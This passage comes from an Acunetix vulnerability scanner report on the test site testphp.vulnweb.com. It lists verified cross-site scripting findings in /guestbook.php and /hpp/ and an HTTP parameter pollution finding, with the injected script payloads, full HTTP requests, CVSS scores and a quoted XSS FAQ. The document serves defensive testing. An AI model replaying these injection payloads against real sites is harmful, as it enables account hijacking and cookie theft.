          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="37" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">text</font></b> was set to <b><font color="dark">1'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;njp2(9095)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/guestbook.php]]></Affects>
       <Parameter><![CDATA[text]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /guestbook.php HTTP/1.1
Content-Length: 94
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

submit=add%20message&amp;name=anonymous%20user&amp;text=1'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;njp2(9095)&lt;/ScRiPt&gt;]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:11 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4585
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="38" color="orange">
       <Name><![CDATA[HTTP parameter pollution]]></Name>
       <ModuleName><![CDATA[Scripting (HTTP_Parameter_Pollution.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">pp</font></b> was set to <b><font color="dark">12&amp;n979383=v983466</font></b><br/>Parameter precedence: <b><font color="dark">last occurrence</font></b><br/>Affected link: <b><font color="dark">params.php?p=valid&amp;pp=12&amp;n979383=v983466</font></b><br/>Affected parameter: <b><font color="dark">p=valid</font></b>]]></Details>
       <Affects><![CDATA[/hpp/]]></Affects>
       <Parameter><![CDATA[pp]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Configuration]]></Type>
       <Impact><![CDATA[The impact depends on the affected web application. An attacker could <br/>
<ul>
<li>Override existing hardcoded HTTP parameters</li>
<li>Modify the application behaviors</li>
<li>Access and, potentially exploit, uncontrollable variables</li>
<li>Bypass input validation checkpoints and WAFs rules</li>
</ul>]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to HTTP Parameter Pollution attacks.<br/><br/>

HPP attacks consist of injecting encoded query string delimiters into other existing parameters. If the web application does not properly sanitize the user input, a malicious user can compromise the logic of the application to perform either clientside or server-side attacks.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[The application should properly sanitize user input (URL encode) to protect against this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/?pp=12%26n979383=v983466 HTTP/1.1
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:12 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 435
]]></Response>
       </TechnicalDetails>
       <CWE id="88"><![CDATA[CWE-88]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:N/I:P/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no impact to the confidentiality of the system.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[9.1]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[HTTP Parameter Pollution]]></Database>
          <URL><![CDATA[https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="39" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">pp</font></b> was set to <b><font color="dark">12'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;DYEC(9020)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/hpp/]]></Affects>
       <Parameter><![CDATA[pp]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/?pp=12'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;DYEC(9020)&lt;/ScRiPt&gt; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:51:15 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 530
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
